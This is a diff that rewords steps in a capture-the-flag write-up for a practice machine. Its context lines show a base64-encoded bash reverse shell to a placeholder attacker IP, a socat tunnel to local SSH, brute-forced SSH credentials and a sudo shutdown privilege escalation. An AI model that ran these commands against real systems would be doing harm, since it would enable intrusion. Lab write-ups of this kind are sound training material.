@@ -66,7 +66,7 @@ Authorization: Basic cmFzY2FsOnNoZWxsZXk=
 
 ### What is the user flag?
 
-1. Now that we have command injection, let's establish a connection. Prepare a base64-encoded reverse shell payload
+1. With command injection, let's establish a connection. Prepare a base64-encoded reverse shell payload
 
 ```bash
 echo -n "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1" | base64
@@ -121,7 +121,7 @@ chmod +x socat
 ./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22
 ```
 
-5. Now we can brute force SSH credentials through our socat tunnel. Based on our enumeration, we try the username `fox`
+5. Brute force SSH credentials through our socat tunnel. Based on our enumeration, we try the username `fox`
    - Discovered credentials: `fox:batman`
 
 ```bash
@@ -143,7 +143,7 @@ cat /home/fox/user-flag.txt
 
 ### What is the root flag?
 
-1. Now that we have user access, check what sudo privileges the `fox` user has
+1. Check what sudo privileges the `fox` user has
    - This reveals that the `fox` user can run `/usr/sbin/shutdown` as root without a password, which we can exploit for privilege escalation
 
 ```bash
@@ -164,7 +164,7 @@ sudo /usr/sbin/shutdown
 
 <img width="719" height="108" alt="SCREEN10" src="https://github.com/user-attachments/assets/98c77f97-525f-457b-8776-d36658af1bd2" />
 
-3. Now with root access, we can explore the system and find the root flag
+3. With root access, we can explore the system and find the root flag
 
 ```bash
 cd /home/rascal
